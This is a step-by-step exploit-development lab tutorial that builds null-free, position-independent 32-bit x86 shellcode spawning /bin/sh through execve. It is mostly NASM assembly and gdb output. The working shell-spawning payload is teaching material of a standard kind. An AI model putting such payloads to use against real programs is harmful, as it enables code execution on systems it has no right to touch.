### Info
In this lab, we'll create a shellcode that spawns a shell<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR enabled<br>
**Keywords**: shellcode

### Implementation
Getting a command shell on target system allows you to execute arbitrary command, therefore it's one of the most important security flaws.
We'll be using `execve` system call

#### Intro
The `execve` syscall has the following signature and used as the following:
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
The first parameter is the path of executable.Second parameter is the command line arguments for this executable.
The third parameter is the environment parameters to be passed to the executable.
It's used in a C program as the following.
```
int main(void)
{
  char *arg[2];
  arg[0] = "/bin/sh";
  arg[1] = NULL;
  execve("/bin/sh", arg, NULL);
}
```
#### Initial code
The initial code does not follow shellcode requirements (null bytes, position dependency), but we must have a working starting
point to improve. 
* The syscall number is 11 as shown below and assigned to $eax
```
uzi@pwnpatrol:$ grep execve /usr/include/asm/unistd*.h
/usr/include/asm/unistd_32.h:#define __NR_execve 11
```
* Path of executable is `/bin/sh`, its address is assigned to $ebx
* Address of argv address array is prepared in the lines `mov ecx,0 ... mov ecx, esp`  assigned to $ecx
* Environment variables is null and assigned to $edx
```
section .data
cmd db '/bin/sh',0x0
section .text
global _start
_start:
;execve("/bin/sh",{"bin/sh", NULL}, NULL)
mov eax, 11
mov ebx, cmd
mov ecx, 0
push ecx
push ebx
mov ecx, esp
mov edx,0
int 0x80
```
We test this code and be sure that it works
```
uzi@pwnpatrol:$ nasm -f elf shellcode.asm
uzi@pwnpatrol:$ ld -m elf_i386 -o shellcode shellcode.o
uzi@pwnpatrol:$ ./shellcode 
$ ls
build.sh  shellcode  shellcode.asm  shellcode.
```
Until we are sure that shellcode works as expected, we may create elf executable from it and debug if necessary.
In the final step, we'll create a flat binary from it. Here is how debug works.
```
uzi@pwnpatrol:$ gdb -q shellcode
Reading symbols from shellcode...(no debugging symbols found)...done.
(gdb) b _start 
Breakpoint 1 at 0x8048060
(gdb) r
Starting program: /home/uzi/exploit_labs/lab6_really_shellcode/shellcode 
Breakpoint 1, 0x08048060 in _start ()
(gdb) disassemble $eip
Dump of assembler code for function _start:
=> 0x08048060 <+0>:    ....
```

#### Increment 1: Simplifying
Well, this may not be possible for some systems, but in my system, execve works if argv passed as null.
```
section .data
cmd db '/bin/sh',0x0
section .text
global _start
_start:
;execve("/bin/sh", NULL, NULL)
mov eax, 11
mov ebx, cmd
mov ecx, 0
mov edx,0
int 0x80
```

#### Increment 2: Position independency
We remove the data section and push the null terminated "/bin/sh" to the stack.
```
section .text
global _start
_start:
;execve("/bin/sh", NULL, NULL)
push 0x0068732f
push 0x6e69622f
mov eax, 11
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80
```

#### Increment 3: Getting rid of nulls
We use xor to zero the registers and use only the 8bit part of eax to assign 11 to it.<br/>
Additionally, observe that null terminator removed from the first push. Instead a junk byte written there, and later that byte is set to
zero with `mov [esp+7], al`.

```
section .text
global _start
_start:
xor eax,eax
xor ecx,ecx
xor edx,edx
;execve("/bin/sh", NULL, NULL)
push 0x4168732f
push 0x6e69622f
mov [esp+7], al
mov al, 11
mov ebx, esp
int 0x80
```


